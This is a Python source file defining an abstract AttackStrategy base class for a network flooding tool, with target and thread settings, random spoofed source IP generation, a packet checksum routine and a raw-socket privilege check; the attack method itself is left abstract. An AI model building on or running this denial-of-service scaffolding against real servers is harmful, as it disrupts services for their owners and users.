from __future__ import annotations
from abc import ABC, abstractmethod
import random
import socket
from rich.console import Console

console = Console()


class AttackStrategy(ABC):
    def __init__(self, target_ip, target_port, duration=60, threads=50):
        """
        Initialize common attack parameters.

        Args:
            target_ip (str): The IP address of the target server
            target_port (int): The port number to attack
            duration (int): Duration of the attack in seconds (default: 60)
            threads (int): Number of threads to use for the attack (default: 50)
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.packets_sent = 0
        self.attack_active = False
        self.metrics = {
            "dns_requests": [],
            "start_time": None,
            "end_time": None,
            "total_packets": 0,
            "avg_rate": 0.0,
        }

    def generate_random_ip(self):
        ip = ".".join([str(random.randint(1, 254)) for _ in range(4)])
        return ip

    def checksum(self, data):
        if len(data) % 2:
            data += b"\x00"
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        return ~checksum & 0xFFFF

    def _check_raw_socket_privileges(self, protocol=socket.IPPROTO_TCP):
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
            test_socket.close()
            console.print("[bold green]✓ Raw socket privileges verified[/bold green]")
            return True
        except PermissionError:
            console.print(
                "[red]ERROR: This script requires administrator/root privileges to create raw sockets![/red]"
            )
            console.print(
                "[yellow]Please run as administrator (Windows) or with sudo (Linux/Mac)[/yellow]"
            )
            return False
        except Exception as e:
            console.print(f"[red]Socket creation test failed: {e}[/red]")
            return False

    @abstractmethod
    def attack(self):
        pass
